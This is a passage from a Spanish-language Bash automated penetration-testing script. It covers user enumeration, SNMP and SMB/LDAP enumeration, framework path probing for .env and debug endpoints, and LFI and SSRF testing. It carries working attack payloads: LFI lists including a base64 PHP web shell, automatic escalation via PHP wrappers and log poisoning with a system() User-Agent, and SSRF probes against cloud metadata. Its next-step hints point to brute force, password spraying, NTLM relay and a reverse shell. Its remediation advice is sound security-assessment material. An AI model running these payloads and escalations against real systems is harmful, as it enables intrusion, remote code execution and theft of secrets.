        if p: print(url+': '+', '.join(p))
except: pass
" 2>/dev/null)

        if [[ -n "$params_raw" ]]; then
            ok "Parámetros ocultos: ${params_raw}"
            local suspicious; suspicious=$(echo "$params_raw" | grep -iE "debug|admin|test|cmd|exec|file|path|redirect|url|key|token|pass")

            add_finding "ALTO" "Parámetros HTTP Ocultos Detectados" \
                "<pre>${params_raw}</pre>" "7.5" \
                "Auditar cada parámetro. Eliminar debug/admin en producción. Implementar autorización en todos." \
                "Probar cada parámetro para SQLi, XSS, IDOR, Path Traversal, SSRF, Open Redirect."

            [[ -n "$suspicious" ]] && add_finding "CRÍTICO" "Parámetros de Alto Riesgo" \
                "<pre>${suspicious}</pre>" "9.0" \
                "Deshabilitar parámetros debug/admin en producción de inmediato." \
                "Probar: ?debug=true ?admin=1 ?redirect=https://evil.com ?file=../etc/passwd"

            while IFS= read -r p; do
                INTEL_INJECTABLE_URLS+=("${url}?${p}=TEST")
            done < <(echo "$params_raw" | grep -oE '[a-zA-Z_]+ ' | tr -d ' ' | head -20)

            intel_log "arjun: ${#INTEL_INJECTABLE_URLS[@]} targets nuevos para SQLi/XSS/IDOR"
        fi
    else
        ok "arjun: sin parámetros ocultos adicionales."
        add_finding "INFO" "Parámetros Ocultos (arjun)" "Sin parámetros HTTP no documentados detectados." \
            "N/A" "Re-verificar en endpoints de API con métodos POST y PUT." \
            "Probar manualmente en formularios y llamadas AJAX."
    fi
    echo
}

# ─── MÓDULO 25: WPSCAN — WORDPRESS ───────────────────────────────
modulo_wpscan() {
    if [[ "$INTEL_CMS" != "wordpress" ]]; then
        log "MÓDULO 25: WPScan — WordPress no detectado. Saltando."
        return
    fi
    command -v wpscan >/dev/null 2>&1 || { warn "wpscan no disponible: sudo apt install wpscan"; return; }

    log "MÓDULO 25: WPScan — WordPress Security Audit"
    tip "WordPress tiene el 40% de los sitios web. Plugins obsoletos = CVEs garantizados."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/wpscan_results.txt"
    intel_log "WordPress confirmado → ejecutando WPScan completo"

    cmd_show "wpscan --url ${url} --enumerate u,ap,at,dbe --no-banner --format cli-no-colour"
    wpscan --url "${url}" --enumerate u,ap,at,dbe --no-banner \
        --format cli-no-colour -o "${out_file}" 2>/dev/null

    if [[ -s "$out_file" ]]; then
        local wp_users; wp_users=$(grep -A2 "WordPress users" "${out_file}" | grep " - " | head -10)
        [[ -n "$wp_users" ]] && add_finding "ALTO" "Usuarios WordPress Enumerados" \
            "<pre>${wp_users}</pre>" "7.5" \
            "Deshabilitar enumeración: redirigir /wp-json/wp/v2/users. Usar user slugs no predecibles." \
            "Probar credenciales: admin/admin, admin/password123. Usar hydra para brute force."

        local vuln_pl; vuln_pl=$(grep -A3 "vulnerabilit\|Vulnerability" "${out_file}" | head -30)
        [[ -n "$vuln_pl" ]] && add_finding "CRÍTICO" "Plugins WordPress Vulnerables" \
            "<pre>${vuln_pl}</pre>" "9.0" \
            "Actualizar todos los plugins. Desinstalar plugins no usados. Verificar en wpscan.com/plugins." \
            "wpscan --url ${url} --api-token TU_TOKEN para CVEs completos y remediación."

        local wp_ver; wp_ver=$(grep -iE "WordPress version" "${out_file}" | head -1)
        [[ -n "$wp_ver" ]] && add_finding "INFO" "Versión WordPress Detectada" "<pre>${wp_ver}</pre>" \
            "N/A" "Mantener WordPress actualizado siempre." \
            "Verificar actualizaciones en: https://wordpress.org/news/"
    fi
    echo
}

# ─── MÓDULO 26: CRT.SH — CERTIFICATE TRANSPARENCY ───────────────
modulo_crtsh() {
    is_domain "$TARGET" || return

    log "MÓDULO 26: crt.sh — Certificate Transparency"
    tip "100% pasivo. Revela subdominios desde logs públicos de certificados."

    local out_file="${OUTPUT_DIR}/recon/crtsh_subdomains.txt"
    cmd_show "curl -s https://crt.sh/?q=%.${TARGET}&output=json"

    curl -skL --max-time 20 "https://crt.sh/?q=%.${TARGET}&output=json" 2>/dev/null | \
        python3 -c "
import json,sys
try:
    data=json.load(sys.stdin)
    names=set()
    for e in data:
        for n in e.get('name_value','').split('\n'):
            n=n.strip().lstrip('*.')
            if n and '.' in n: names.add(n)
    [print(n) for n in sorted(names)]
except: pass
" 2>/dev/null | tee "${out_file}"

    if [[ -s "$out_file" ]]; then
        local count; count=$(wc -l < "${out_file}")
        ok "crt.sh: ${count} subdominios encontrados"

        local sensitive_subs
        sensitive_subs=$(grep -iE "dev\.|staging\.|test\.|admin\.|internal\.|vpn\.|git\.|ci\.|jenkins\." "${out_file}" 2>/dev/null)

        add_finding "INFO" "Subdominios via Certificate Transparency (${count})" \
            "<pre>$(head -30 "${out_file}")</pre>" "N/A" \
            "Inventariar subdominios. Dar de baja los no usados para reducir superficie de ataque." \
            "Verificar subdomain takeover: nuclei -t takeovers/ -l ${out_file}"

        [[ -n "$sensitive_subs" ]] && add_finding "MEDIO" "Subdominios Sensibles Expuestos" \
            "<pre>${sensitive_subs}</pre>" "5.3" \
            "Staging/dev no deben ser públicos. Proteger con VPN o autenticación básica." \
            "Verificar acceso a cada subdominio. Buscar credenciales por defecto y debug activo."

        while IFS= read -r sub; do
            [[ -n "$sub" ]] && INTEL_SUBDOMAINS+=("$sub")
        done < "${out_file}"
        intel_log "crt.sh: ${count} subdominios registrados"
    fi
    echo
}

# ─── MÓDULO 27: SMTP-USER-ENUM ───────────────────────────────────
modulo_smtp_enum() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(25|465|587|2525)(,|$)" || return
    command -v smtp-user-enum >/dev/null 2>&1 || { warn "smtp-user-enum: sudo apt install smtp-user-enum"; return; }

    log "MÓDULO 27: smtp-user-enum — Enumeración de Usuarios SMTP"
    tip "VRFY/EXPN confirman usuarios sin autenticación. Vector para phishing y password spray."

    local out_file="${OUTPUT_DIR}/recon/smtp_users.txt"
    local wordlist="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    [[ ! -f "$wordlist" ]] && wordlist="/usr/share/wordlists/metasploit/unix_users.txt"
    [[ ! -f "$wordlist" ]] && { warn "Wordlist de usuarios no encontrada."; return; }

    cmd_show "smtp-user-enum -M VRFY -U ${wordlist} -t ${TARGET}"
    smtp-user-enum -M VRFY -U "${wordlist}" -t "${TARGET}" 2>/dev/null | tee "${out_file}"

    if grep -qi "exists\|250\|valid" "${out_file}" 2>/dev/null; then
        local valid_users; valid_users=$(grep -iE "exists|250|valid" "${out_file}" | grep -v "not exist" | head -20)
        add_finding "ALTO" "Usuarios Válidos via SMTP VRFY" \
            "<pre>${valid_users}</pre>" "7.5" \
            "Deshabilitar VRFY y EXPN en Postfix: disable_vrfy_command=yes. Revisar configuración Sendmail." \
            "Usar usuarios en password spray o credential stuffing contra webmail/VPN/SSH."
        intel_log "Usuarios SMTP válidos encontrados"
    else
        ok "SMTP: sin usuarios confirmados via VRFY."
    fi
    echo
}

# ─── MÓDULO 28: SNMPWALK — SNMP ──────────────────────────────────
modulo_snmp() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)161(,|$)" || return
    command -v snmpwalk >/dev/null 2>&1 || { warn "snmpwalk: sudo apt install snmp"; return; }

    log "MÓDULO 28: snmpwalk — SNMP Enumeration"
    tip "SNMP expone configuración de red, interfaces, rutas, procesos y credenciales."

    local out_file="${OUTPUT_DIR}/recon/snmp_walk.txt"
    local communities=("public" "private" "community" "manager" "snmp" "cisco" "admin")

    for comm in "${communities[@]}"; do
        local result; result=$(snmpwalk -v2c -c "${comm}" "${TARGET}" 2>/dev/null | head -30)
        if [[ -n "$result" ]]; then
            ok "SNMP accesible con community: ${comm}"
            echo "$result" >> "${out_file}"
            add_finding "CRÍTICO" "SNMP con Community String por Defecto: '${comm}'" \
                "<pre>$(head -20 "${out_file}")</pre>" "9.8" \
                "1) Cambiar community strings. 2) Usar SNMPv3 con autenticación. 3) Restringir acceso por ACL/IP. 4) Deshabilitar si no se usa." \
                "Dump completo: snmpwalk -v2c -c ${comm} ${TARGET} | Buscar: interfaces, rutas, procesos, config"
            intel_log "SNMP abierto con '${comm}' → infraestructura expuesta"
            break
        fi
    done
    echo
}

# ─── MÓDULO 29: CRACKMAPEXEC — SMB/LDAP ──────────────────────────
modulo_cme() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(445|139|389|5985)(,|$)" || return
    local CME_CMD=""
    command -v crackmapexec >/dev/null 2>&1 && CME_CMD="crackmapexec"
    command -v cme           >/dev/null 2>&1 && CME_CMD="cme"
    [[ -z "$CME_CMD" ]] && { warn "crackmapexec no disponible: sudo apt install crackmapexec"; return; }

    log "MÓDULO 29: CrackMapExec — SMB/LDAP/WinRM Enumeration"
    tip "CME identifica null sessions, SMB signing, versiones y dominios AD sin credenciales."

    local out_file="${OUTPUT_DIR}/recon/cme_results.txt"

    if echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(445|139)(,|$)"; then
        cmd_show "${CME_CMD} smb ${TARGET} --shares"
        ${CME_CMD} smb "${TARGET}" --shares 2>/dev/null | tee -a "${out_file}"

        grep -qi "null\|anonymous\|\[\+\]" "${out_file}" 2>/dev/null && \
            add_finding "ALTO" "SMB: Sesión Anónima Posible" \
            "<pre>$(head -20 "${out_file}")</pre>" "7.5" \
            "Deshabilitar sesiones null. Requerir firma SMB. Actualizar a SMBv3." \
            "Enumerar shares: smbclient -L //${TARGET} -N | Montar: smbclient //${TARGET}/SHARE -N"

        grep -qi "signing:False\|signing: False" "${out_file}" 2>/dev/null && \
            add_finding "MEDIO" "SMB Signing Deshabilitado" \
            "Permite ataques NTLM Relay para captura y relay de hashes." "6.8" \
            "Habilitar SMB Signing via GPO: Microsoft network server: Digitally sign communications = Enabled" \
            "Explotar con: responder -I eth0 + ntlmrelayx.py -t smb://${TARGET}"
    fi

    if echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)389(,|$)"; then
        cmd_show "${CME_CMD} ldap ${TARGET} --users --groups"
        ${CME_CMD} ldap "${TARGET}" --users --groups 2>/dev/null | tee -a "${out_file}"

        grep -qi "\[\+\]\|user\|group" "${out_file}" 2>/dev/null && \
            add_finding "ALTO" "LDAP: Enumeración AD Anónima" \
            "<pre>$(grep -iE 'user:|group:|cn=' "${out_file}" | head -20)</pre>" "7.5" \
            "Deshabilitar LDAP anónimo. Requerir autenticación. Implementar LDAPS (TLS)." \
            "Dump completo: ldapsearch -x -H ldap://${TARGET} -b 'dc=dominio,dc=com'"
        intel_log "AD: usuarios/grupos expuestos via LDAP"
    fi
    echo
}



# ════════════════════════════════════════════════════════════════
# HELPER: Rutas críticas por framework detectado
# ════════════════════════════════════════════════════════════════
_build_framework_routes() {
    INTEL_FRAMEWORK_ROUTES=()
    local base_url="$1"

    case "$INTEL_FRAMEWORK_JS" in
        nextjs)
            INTEL_FRAMEWORK_ROUTES+=("/_next/static/" "/_next/data/" "/api/" "/api/auth/" "/_next/webpack-hmr" "/.env.local" "/.env")
            intel_log "Next.js routes: /_next/, /api/, .env.local registradas"
            ;;
        nuxt)
            INTEL_FRAMEWORK_ROUTES+=("/_nuxt/" "/api/" "/_nuxt/static/" "/.env" "/.nuxtignore")
            ;;
        astro)
            INTEL_FRAMEWORK_ROUTES+=("/_astro/" "/dist/" "/src/" "/.env" "/astro.config.mjs")
            ;;
        svelte)
            INTEL_FRAMEWORK_ROUTES+=("/.svelte-kit/" "/api/" "/src/" "/.env" "/svelte.config.js")
            ;;
        remix)
            INTEL_FRAMEWORK_ROUTES+=("/build/" "/app/" "/routes/" "/.env")
            ;;
        gatsby)
            INTEL_FRAMEWORK_ROUTES+=("/page-data/" "/static/" "/.cache/" "/.env")
            ;;
    esac

    case "$INTEL_FRAMEWORK_BACKEND" in
        laravel)
            INTEL_FRAMEWORK_ROUTES+=("/.env" "/storage/logs/laravel.log" "/telescope" "/horizon" "/telescope/api/requests" "/api/documentation" "/_ignition/health-check" "/laravel-websockets" "/phpinfo.php")
            intel_log "Laravel routes: .env, telescope, horizon registradas"
            ;;
        symfony)
            INTEL_FRAMEWORK_ROUTES+=("/_profiler" "/_wdt" "/app_dev.php" "/config.php" "/.env" "/var/log/dev.log" "/.env.local" "/app/cache/" "/phpinfo.php")
            intel_log "Symfony: /_profiler (debug toolbar) registrado"
            ;;
        django)
            INTEL_FRAMEWORK_ROUTES+=("/admin/" "/admin/login/" "/__debug__/" "/api/" "/api/schema/" "/api/docs/" "/.env" "/settings.py" "/manage.py")
            intel_log "Django: /admin/ y debug toolbar registrados"
            ;;
        fastapi)
            INTEL_FRAMEWORK_ROUTES+=("/docs" "/redoc" "/openapi.json" "/api/" "/health" "/metrics" "/.env")
            intel_log "FastAPI: /docs y /redoc (EXPUESTOS por default!) registrados"
            add_finding "ALTO" "FastAPI Detectado — Swagger Posiblemente Expuesto" \
                "FastAPI expone /docs y /redoc por defecto en producción si no se configura correctamente." \
                "7.5" \
                "Deshabilitar en producción: FastAPI(docs_url=None, redoc_url=None)" \
                "Verificar: curl ${base_url}/docs | curl ${base_url}/openapi.json"
            ;;
        flask)
            INTEL_FRAMEWORK_ROUTES+=("/console" "/_debug" "/.env" "/config.py" "/wsgi.py" "/requirements.txt")
            intel_log "Flask: /console (debug mode RCE!) registrado"
            ;;
        nestjs)
            INTEL_FRAMEWORK_ROUTES+=("/api" "/api/json" "/swagger" "/swagger-ui" "/.env" "/health" "/metrics" "/graphql")
            intel_log "NestJS: /api (Swagger auto-gen) registrado"
            ;;
        aspnet)
            INTEL_FRAMEWORK_ROUTES+=("/trace.axd" "/elmah.axd" "/webresource.axd" "/ScriptResource.axd" "/admin/" "/web.config" "/app_offline.htm" "/elmah/" "/glimpse.axd")
            intel_log "ASP.NET: trace.axd, elmah.axd registrados → info disclosure"
            ;;
        dotnetcore)
            INTEL_FRAMEWORK_ROUTES+=("/swagger" "/swagger/v1/swagger.json" "/healthz" "/health" "/metrics" "/liveness" "/readiness" "/_framework/" "/appsettings.json")
            intel_log ".NET Core: /swagger, /healthz, /metrics registrados"
            ;;
        rails)
            INTEL_FRAMEWORK_ROUTES+=("/rails/info" "/rails/mailers" "/rails/conductor" "/.env" "/config/database.yml" "/config/secrets.yml" "/db/schema.rb")
            intel_log "Rails: /rails/info registrado → info disclosure"
            ;;
        express)
            INTEL_FRAMEWORK_ROUTES+=("/api/" "/api/v1/" "/api/v2/" "/.env" "/package.json" "/package-lock.json" "/node_modules/" "/config.js" "/app.js")
            intel_log "Express: /package.json, .env registrados"
            ;;
    esac

    # Windows IIS específico
    if [[ "$INTEL_OS" == "windows" ]] || [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " iis " ]]; then
        INTEL_FRAMEWORK_ROUTES+=("/iisstart.htm" "/welcome.png" "/_vti_bin/shtml.dll" "/_vti_inf.html" "/postinfo.html" "/robots.txt" "/web.config" "/bin/")
        intel_log "IIS Windows: rutas específicas registradas"
    fi

    intel_log "Framework routes totales: ${#INTEL_FRAMEWORK_ROUTES[@]}"
}

# ─── MÓDULO 30: FRAMEWORK DEEP SCAN ──────────────────────────────
modulo_framework_scan() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    [[ -z "$INTEL_FRAMEWORK_JS" && -z "$INTEL_FRAMEWORK_BACKEND" && -z "$INTEL_CMS" ]] && {
        warn "Sin framework detectado. Ejecuta whatweb primero (módulo 6)."
        return
    }

    log "MÓDULO 30: Framework Deep Scan — Rutas Críticas por Stack"
    tip "Cada framework expone rutas y archivos sensibles únicos. Este módulo los busca todos."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/framework_scan.txt"
    local hits=0
    local hits_html=""

    # Construir rutas si aún no están
    [[ ${#INTEL_FRAMEWORK_ROUTES[@]} -eq 0 ]] && _build_framework_routes "$base_url"

    intel_log "Probando ${#INTEL_FRAMEWORK_ROUTES[@]} rutas del framework ${INTEL_FRAMEWORK_JS:-}${INTEL_FRAMEWORK_BACKEND:-}"

    for route in "${INTEL_FRAMEWORK_ROUTES[@]}"; do
        local full_url="${base_url%/}${route}"
        local status
        status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "$full_url" 2>/dev/null)

        if [[ "$status" == "200" || "$status" == "301" || "$status" == "302" || "$status" == "403" ]]; then
            echo "[${status}] ${full_url}" | tee -a "$out_file"
            ((hits++))

            # Clasificar por peligrosidad
            local sev="INFO" cvss="N/A"
            if echo "$route" | grep -qiE "\.env|config|secret|credential|password|token|key|\.git|laravel\.log|database\.yml|web\.config|appsettings"; then
                sev="CRÍTICO"; cvss="9.5"
            elif echo "$route" | grep -qiE "telescope|horizon|_profiler|console|trace\.axd|elmah|debug|admin"; then
                sev="ALTO"; cvss="7.5"
            elif echo "$route" | grep -qiE "swagger|docs|redoc|openapi|healthz|metrics"; then
                sev="MEDIO"; cvss="5.3"
            fi

            if [[ "$sev" != "INFO" ]]; then
                local content_preview
                content_preview=$(curl -skL --max-time 8 "$full_url" 2>/dev/null | head -c 500)
                local rem="" ns=""

                case "$route" in
                    *".env"*)
                        rem="Eliminar .env del webroot. Usar variables de entorno del sistema o secretos de CI/CD."
                        ns="cat ${full_url} | grep -iE 'DB_|SECRET|KEY|PASS|TOKEN'"
                        ;;
                    *"telescope"*|*"horizon"*)
                        rem="Proteger Laravel Telescope/Horizon con middleware de autenticación. Solo para admins."
                        ns="Acceder a ${full_url} para ver requests, jobs, queries en tiempo real"
                        ;;
                    *"_profiler"*|*"_wdt"*)
                        rem="Deshabilitar Symfony Profiler en producción: APP_ENV=prod en .env"
                        ns="Explorar ${full_url} para ver queries SQL, variables de sesión, requests"
                        ;;
                    *"trace.axd"*|*"elmah"*)
                        rem="Deshabilitar trace.axd y ELMAH en web.config de producción."
                        ns="curl ${full_url} para ver stack traces y errores de aplicación"
                        ;;
                    *"swagger"*|*"docs"*|*"redoc"*)
                        rem="Deshabilitar swagger en producción o proteger con autenticación."
                        ns="Parsear ${full_url}/openapi.json para extraer todos los endpoints y parámetros"
                        ;;
                esac

                add_finding "$sev" \
                    "[$status] Ruta Crítica de Framework Expuesta: ${route}" \
                    "<b>URL:</b> ${full_url}<br><b>HTTP:</b> ${status}<br><pre>${content_preview}</pre>" \
                    "$cvss" "$rem" "$ns"

                # INTEL: guardar para pruebas adicionales
                INTEL_SENSITIVE_PATHS+=("$full_url")
                [[ "$route" =~ (openapi|swagger) ]] && INTEL_SWAGGER_URL="$full_url"
            fi

            hits_html+="<tr><td>${status}</td><td><a href='${full_url}'>${route}</a></td><td style='color:$([ "$sev" = "CRÍTICO" ] && echo "#ff2d2d" || echo "#ffd23f")'>${sev}</td></tr>"

            [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
        fi
    done

    ok "Framework scan: ${hits} rutas encontradas"
    [[ $hits -gt 0 ]] && add_finding "MEDIO" \
        "Framework Scan: ${hits} rutas accesibles (${INTEL_FRAMEWORK_JS:-}${INTEL_FRAMEWORK_BACKEND:-})" \
        "<table class='vuln-table'><tr><th>HTTP</th><th>Ruta</th><th>Severidad</th></tr>${hits_html}</table>" \
        "5.0" \
        "Auditar cada ruta encontrada. Deshabilitar o proteger las de debug/admin en producción." \
        "Probar cada ruta con arjun para parámetros ocultos y con SQLi/XSS básico"
    echo
}

# ─── MÓDULO 31: LFI / PATH TRAVERSAL ─────────────────────────────
modulo_lfi() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 31: LFI / Path Traversal"
    tip "LFI es crítico en PHP/Python. Con log poisoning puede escalar a RCE."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/lfi_results.txt"
    local found=0

    # Payloads LFI — Linux y Windows
    local LFI_PAYLOADS=(
        "../../../etc/passwd"
        "../../../../etc/passwd"
        "../../../../../etc/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252Fetc%252Fpasswd"
        "....//....//....//etc/passwd"
        "..././..././..././etc/passwd"
        "php://filter/convert.base64-encode/resource=index.php"
        "php://filter/read=string.rot13/resource=index.php"
        "php://input"
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        "expect://id"
        "file:///etc/passwd"
        # Windows
        "..\\..\\..\\windows\\win.ini"
        "..%5C..%5C..%5Cwindows%5Cwin.ini"
        "C:\\windows\\win.ini"
        "/proc/self/environ"
        "/proc/self/cmdline"
        "/var/log/apache2/access.log"
        "/var/log/nginx/access.log"
    )

    # Indicadores de éxito
    local SUCCESS_PATTERNS=(
        "root:x:0:0"
        "bin:x:1:1"
        "www-data"
        "[extensions]"
        "for 16-bit"
        "base64_encoded"
    )

    # Parámetros comunes para LFI
    local LFI_PARAMS=("file" "page" "include" "path" "document" "folder" "root" "pg" "style" "pdf" "template" "php_path" "doc" "view" "content" "layout" "mod" "conf")

    # Agregar parámetros descubiertos por arjun
    if [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]]; then
        intel_log "LFI: usando ${#INTEL_INJECTABLE_URLS[@]} URLs de gobuster/arjun"
    fi

    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")

    # Construir URLs de prueba con parámetros típicos
    for param in "${LFI_PARAMS[@]}"; do
        test_urls+=("${base_url}/?${param}=test")
        [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " php " ]] && \
            test_urls+=("${base_url}/index.php?${param}=test")
    done

    for test_url in "${test_urls[@]:0:20}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
        [[ -z "$param" ]] && continue

        for payload in "${LFI_PAYLOADS[@]:0:8}"; do
            local probe_url="${test_url%=*}=${payload}"
            local response
            response=$(curl -skL --max-time 10 "$probe_url" 2>/dev/null)

            for pattern in "${SUCCESS_PATTERNS[@]}"; do
                if echo "$response" | grep -q "$pattern"; then
                    warn "LFI DETECTADO: ${probe_url} → ${pattern}"
                    echo "LFI: ${probe_url}" >> "$out_file"
                    ((found++))

                    INTEL_LFI_FOUND=true
                    INTEL_LFI_PARAM="$param"
                    INTEL_LFI_URL="${test_url%=*}="

                    add_finding "CRÍTICO" \
                        "Local File Inclusion (LFI) Confirmado" \
                        "<b>URL:</b> ${probe_url}<br><b>Parámetro:</b> ${param}<br><b>Evidencia:</b> <pre>${response:0:300}</pre>" \
                        "9.8" \
                        "1) Validar parámetros de archivo con lista blanca. 2) Usar realpath() + verificar que esté dentro del directorio permitido. 3) Nunca incluir archivos basados en input del usuario directamente." \
                        "Escalar a RCE: Log poisoning → curl -H 'User-Agent: <?php system(\$_GET[cmd]); ?>' ${base_url} y luego LFI a /var/log/apache2/access.log?cmd=id"

                    intel_log "LFI confirmado → escalando a RFI y log poisoning"
                    break 2
                fi
            done

            [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
        done
        [[ "$INTEL_LFI_FOUND" == "true" ]] && break
    done

    # Si LFI encontrado → escalar automáticamente
    if [[ "$INTEL_LFI_FOUND" == "true" ]]; then
        _escalate_lfi "$base_url"
    else
        ok "LFI: sin indicios detectados con payloads básicos."
        add_finding "INFO" "LFI / Path Traversal" "Sin LFI detectado en parámetros probados." \
            "N/A" \
            "Revisar manualmente parámetros que incluyan archivos (file=, page=, path=, include=)." \
            "Probar con Burp Intruder y wordlist de LFI de SecLists: /usr/share/seclists/Fuzzing/LFI/"
    fi
    echo
}

# Helper: Escalar LFI a más vectores
_escalate_lfi() {
    local base_url="$1"
    local lfi_base="${INTEL_LFI_URL}"
    [[ -z "$lfi_base" ]] && return

    intel_log "Escalando LFI: intentando RFI, wrappers PHP, log poisoning..."
    local escalation_html=""

    # PHP wrappers
    local php_wrappers=(
        "php://filter/convert.base64-encode/resource=index.php"
        "php://filter/convert.base64-encode/resource=../config.php"
        "php://filter/convert.base64-encode/resource=../.env"
        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        "data://text/plain,<?php phpinfo(); ?>"
        "zip://shell.zip%23shell.php"
    )

    for wrapper in "${php_wrappers[@]}"; do
        local resp
        resp=$(curl -skL --max-time 8 "${lfi_base}${wrapper}" 2>/dev/null)
        if echo "$resp" | grep -qiE "base64|phpinfo|PHP Version|root:"; then
            add_finding "CRÍTICO" \
                "LFI Escalado: PHP Wrapper Funcional — ${wrapper%%/*}" \
                "<b>Wrapper:</b> ${wrapper}<br><pre>${resp:0:400}</pre>" \
                "10.0" \
                "Deshabilitar allow_url_include y allow_url_fopen en php.ini. Usar open_basedir." \
                "Leer código fuente: ${lfi_base}php://filter/convert.base64-encode/resource=ARCHIVO | base64 -d"
            escalation_html+="<li>PHP Wrapper: ${wrapper%%/*} ✅</li>"
            break
        fi
    done

    # Log poisoning
    local log_files=("/var/log/apache2/access.log" "/var/log/nginx/access.log" "/var/log/httpd/access_log" "/proc/self/environ" "/var/log/mail.log")
    for logf in "${log_files[@]}"; do
        local resp
        resp=$(curl -skL --max-time 5 "${lfi_base}${logf}" 2>/dev/null)
        if echo "$resp" | grep -qiE "GET|POST|HTTP|User-Agent|mozilla"; then
            add_finding "CRÍTICO" \
                "Log Poisoning Posible via LFI — ${logf}" \
                "<b>Log accesible:</b> ${logf}<br>Inyectar código PHP en logs para RCE completo." \
                "10.0" \
                "Corregir el LFI base. Restringir open_basedir. Logs no deben estar en webroot." \
                "RCE: 1) curl -H 'User-Agent: \`<?php system(\$_GET[\"c\"]); ?>\`' ${base_url} | 2) ${lfi_base}${logf}&c=id"
            escalation_html+="<li>Log Poisoning via ${logf} ✅</li>"
            break
        fi
    done

    [[ -n "$escalation_html" ]] && \
        add_finding "CRÍTICO" "LFI Escalación Exitosa" \
            "<ul>${escalation_html}</ul>" "10.0" \
            "Corregir LFI base inmediatamente. Ver hallazgos individuales." \
            "Intentar reverse shell via LFI+Log Poisoning"
}



# ─── MÓDULO 32: SSRF ─────────────────────────────────────────────
modulo_ssrf() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 32: SSRF — Server-Side Request Forgery"
    tip "SSRF está en OWASP Top 10. Permite acceder a infraestructura interna y metadata de cloud."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/ssrf_results.txt"

    # Parámetros típicos de SSRF
    local SSRF_PARAMS=("url" "uri" "path" "src" "source" "href" "link" "redirect" "next" "return" "target" "dest" "destination" "redir" "callback" "fetch" "load" "proxy" "remote" "request" "to" "out" "from" "u" "image" "img" "endpoint" "api" "host" "server" "page")
    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")
    for param in "${SSRF_PARAMS[@]}"; do
        test_urls+=("${base_url}/?${param}=test")
    done

    # Payloads SSRF para detección básica (blind + semi-blind)
    local SSRF_PROBES=(
        "http://127.0.0.1/"
        "http://localhost/"
        "http://0.0.0.0/"
        "http://[::1]/"
        "http://127.1/"
        "http://2130706433/"
    )

    local found=0
    for test_url in "${test_urls[@]:0:15}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
        [[ -z "$param" ]] && continue

        for probe in "${SSRF_PROBES[@]}"; do
            local probe_url="${test_url%=*}=${probe}"
            local resp
            resp=$(curl -skL --max-time 8 "$probe_url" 2>/dev/null)
            local status
            status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "$probe_url" 2>/dev/null)

            # Detectar respuesta interna
            if echo "$resp" | grep -qiE "root:|bin:|localhost|127\\.0\\.0|internal|private|admin|dashboard|api|health" && [[ "$status" != "400" && "$status" != "422" ]]; then
                warn "SSRF DETECTADO: ${probe_url}"
                echo "SSRF: ${probe_url}" >> "$out_file"
                ((found++))

                INTEL_SSRF_FOUND=true
                INTEL_SSRF_URL="${test_url%=*}="

                add_finding "CRÍTICO" \
                    "SSRF Confirmado — Acceso a Recursos Internos" \
                    "<b>URL:</b> ${probe_url}<br><b>Parámetro:</b> ${param}<br><b>Respuesta:</b><pre>${resp:0:400}</pre>" \
                    "9.8" \
                    "1) Validar y sanitizar URLs con lista blanca de dominios permitidos. 2) Bloquear rangos de IP privados (127.x, 10.x, 172.16-31.x, 192.168.x). 3) Deshabilitar redireccionamientos automáticos. 4) Usar un proxy de salida con filtrado." \
                    "Escalar: probar metadata cloud → ${INTEL_SSRF_URL}http://169.254.169.254/latest/meta-data/"

                intel_log "SSRF confirmado → probando metadata cloud"
                _escalate_ssrf
                break 2
            fi
        done
    done

    if [[ $found -eq 0 ]]; then
        ok "SSRF: sin indicios básicos en parámetros URL probados."
        add_finding "INFO" "SSRF" "Sin SSRF básico detectado. Requiere prueba manual en funcionalidades de fetch/webhook." \
            "N/A" \
            "Revisar manualmente: webhooks, importar URL, generar PDF desde URL, preview de links." \
            "Usar Burp Collaborator o interactsh para SSRF blind: https://app.interactsh.com"
    fi
    echo
}

_escalate_ssrf() {
    local ssrf_base="${INTEL_SSRF_URL}"
    [[ -z "$ssrf_base" ]] && return
    intel_log "SSRF → probando acceso a metadata de cloud provider..."

    # AWS metadata
    local AWS_META="http://169.254.169.254/latest/meta-data/"
    local aws_resp
    aws_resp=$(curl -skL --max-time 8 "${ssrf_base}${AWS_META}" 2>/dev/null)
